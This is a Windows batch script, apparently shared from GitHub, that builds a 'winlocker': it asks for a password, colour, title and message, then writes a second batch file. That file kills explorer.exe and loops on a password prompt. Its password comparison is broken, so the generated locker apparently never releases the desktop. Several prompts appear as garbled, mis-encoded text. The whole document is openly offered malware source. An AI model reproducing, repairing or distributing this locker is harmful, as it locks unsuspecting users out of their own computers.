@echo off
chcp 65001
title BUILDER BY KRYYAA\\
echo winlocker builder by kryyaa!!
echo see more on github: kryyyaaaa
TIMEOUT /T 4 /NOBREAK
cls
echo Builder ver0.9.2!
TIMEOUT /T 1 /NOBREAK >nul
set /p name=��� ��� ���������: 
set /p col=���� ��� ���������: 
set /p pa=������ ��� ���������: 
set /p titl=��������� ��� ���������: 
set /p txt=����� � ���������: 

(echo.@echo off
echo.chcp 65001
echo.color %col%
echo.title %titl%
echo.:vir
echo.taskkill /f /im explorer.exe
echo.cls
echo.echo %txt%
echo.set /p pass=password: 
echo.if pass == %pa% goto done
echo.echo �������� ������!
echo.timeout /t 1 /nonebreak >nul
echo.goto vir
echo.:done
echo.start explorer.exe )>%name%.bat

echo created!
start REEDME.txt
TIMEOUT /T 4 /NOBREAK >nul